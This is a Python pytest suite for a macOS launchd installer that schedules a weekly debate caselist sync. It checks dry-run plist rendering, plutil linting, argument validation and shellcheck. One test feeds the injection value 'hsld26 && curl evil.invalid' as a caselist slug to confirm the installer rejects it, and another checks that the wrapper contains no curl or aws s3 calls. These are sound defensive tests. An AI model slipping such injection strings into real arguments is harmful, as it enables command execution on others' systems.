"""`ops/launchd/install.sh --dry-run`: does it render a plist macOS will actually load?

The weekly schedule is one shell script, one wrapper and one XML template, and the way that goes
wrong is silent — a plist with a typo is a plist `launchctl bootstrap` refuses, weeks after
anybody looked at it. So the installer's dry run is rendered here and handed to `plutil -lint`,
which is the same check `launchctl` does.

`plutil` is macOS's, and the agent is macOS's, so the lint is skipped elsewhere; everything that
is not macOS-specific — the placeholders being filled in, the caselist arguments being the ones
asked for, the committed files naming no slug and no home directory, and both scripts passing
shellcheck — runs everywhere.

Nothing here loads, bootstraps or enables anything, and nothing writes outside `tmp_path`. The
one thing this suite must never do is put a schedule on the machine it runs on.
"""

from __future__ import annotations

import os
import platform
import shutil
import subprocess
import sys
from pathlib import Path

import pytest

REPOSITORY_ROOT = Path(__file__).resolve().parents[2]
LAUNCHD_DIRECTORY = REPOSITORY_ROOT / "ops" / "launchd"
INSTALL_SCRIPT = LAUNCHD_DIRECTORY / "install.sh"
WRAPPER_SCRIPT = LAUNCHD_DIRECTORY / "run-caselist-sync.sh"
TEMPLATE = LAUNCHD_DIRECTORY / "com.debate-intelligence.caselist-sync.plist.template"

on_macos = pytest.mark.skipif(
    platform.system() != "Darwin", reason="launchd and plutil are macOS's; the agent runs there"
)


def install(*arguments: str, home: Path) -> subprocess.CompletedProcess[str]:
    """Run the installer with `HOME` pointed at a temporary directory, never the operator's."""
    environment = dict(os.environ, HOME=str(home))
    return subprocess.run(
        [str(INSTALL_SCRIPT), *arguments],
        capture_output=True,
        text=True,
        check=False,
        env=environment,
        cwd=REPOSITORY_ROOT,
    )


@pytest.fixture
def home(tmp_path: Path) -> Path:
    fake_home = tmp_path / "home"
    (fake_home / "Library" / "LaunchAgents").mkdir(parents=True)
    return fake_home


def test_a_dry_run_renders_every_placeholder_and_writes_nothing(home: Path) -> None:
    rendered = install(
        "--caselist", "testcl26", "--caselist", "othercl26",
        "--env", "dev", "--aws-profile", "debate-dev-evidence",
        "--weekday", "3", "--hour", "6", "--minute", "0",
        "--log-dir", str(home / "Library" / "Logs" / "debate-research"),
        "--dry-run",
        home=home,
    )  # fmt: skip

    assert rendered.returncode == 0, rendered.stderr
    assert "@" not in rendered.stdout, "a placeholder was left unfilled"
    assert "<key>StartCalendarInterval</key>" in rendered.stdout
    assert "<key>Weekday</key>\n        <integer>3</integer>" in rendered.stdout
    assert "<string>--caselist</string>\n        <string>testcl26</string>" in rendered.stdout
    assert "<string>--caselist</string>\n        <string>othercl26</string>" in rendered.stdout
    assert str(WRAPPER_SCRIPT) in rendered.stdout
    assert "<string>dev</string>" in rendered.stdout
    assert "<string>debate-dev-evidence</string>" in rendered.stdout
    assert list((home / "Library" / "LaunchAgents").iterdir()) == [], "a dry run installed an agent"


@on_macos
def test_the_rendered_plist_is_one_launchctl_will_load(home: Path, tmp_path: Path) -> None:
    """The criterion the whole schedule rests on: `plutil -lint` is what `launchctl` runs too."""
    rendered = install("--caselist", "testcl26", "--env", "dev", "--dry-run", home=home)
    assert rendered.returncode == 0, rendered.stderr

    written = tmp_path / "agent.plist"
    written.write_text(rendered.stdout, encoding="utf-8")
    linted = subprocess.run(["plutil", "-lint", str(written)], capture_output=True, text=True, check=False)

    assert linted.returncode == 0, linted.stdout + linted.stderr


def test_the_installer_refuses_a_run_with_no_caselist(home: Path) -> None:
    """No default list, here or anywhere: which caselists to follow is the operator's decision."""
    refused = install("--dry-run", home=home)

    assert refused.returncode == 2
    assert "--caselist" in refused.stderr


def test_the_installer_refuses_anything_that_is_not_a_caselist_slug(home: Path) -> None:
    """The slug goes into an XML document the agent runs weekly; it is checked before it does."""
    refused = install("--caselist", "hsld26 && curl evil.invalid", "--dry-run", home=home)

    assert refused.returncode == 2
    assert "not a caselist slug" in refused.stderr


def test_the_installer_refuses_an_environment_that_is_not_dev_or_prod(home: Path) -> None:
    refused = install("--caselist", "testcl26", "--env", "staging", "--dry-run", home=home)

    assert refused.returncode == 2
    assert "dev or prod" in refused.stderr


def test_the_committed_files_name_no_caselist_and_no_home_directory() -> None:
    """The task spec's constraint, checked rather than remembered.

    A slug or an absolute user path in a committed file would make this repository's copy of the
    agent one particular machine's, and the next person to install it would get Charlie's.
    """
    for committed in (TEMPLATE, INSTALL_SCRIPT, WRAPPER_SCRIPT):
        text = committed.read_text(encoding="utf-8")
        assert "/Users/" not in text, f"{committed.name} carries an absolute user path"
        for slug in ("hsld26", "hspolicy26", "hspf26"):
            for line in text.splitlines():
                if slug in line:
                    assert line.lstrip().startswith(("#", "*", "<!--")) or "--help" in line, (
                        f"{committed.name} names {slug} outside a comment or a usage example"
                    )


def test_the_shell_scripts_pass_shellcheck() -> None:
    """Both scripts run unattended for years; a quoting bug in one is a schedule that stops."""
    shellcheck = shutil.which("shellcheck") or str(Path(sys.executable).parent / "shellcheck")
    if not Path(shellcheck).exists():
        pytest.skip("shellcheck is not installed in this environment")

    checked = subprocess.run(
        [shellcheck, str(INSTALL_SCRIPT), str(WRAPPER_SCRIPT)],
        capture_output=True,
        text=True,
        check=False,
    )

    assert checked.returncode == 0, checked.stdout + checked.stderr


def test_the_wrapper_only_calls_the_command(home: Path) -> None:
    """The spec forbids pipeline logic in the wrapper: it sets the environment and execs."""
    text = WRAPPER_SCRIPT.read_text(encoding="utf-8")
    body = [line.strip() for line in text.splitlines() if line.strip() and not line.strip().startswith("#")]

    assert body[-1].startswith('exec "${DEBATE_RESEARCH_BIN}" --json caselist pull')
    assert "curl" not in text and "aws s3" not in text and "unzip" not in text
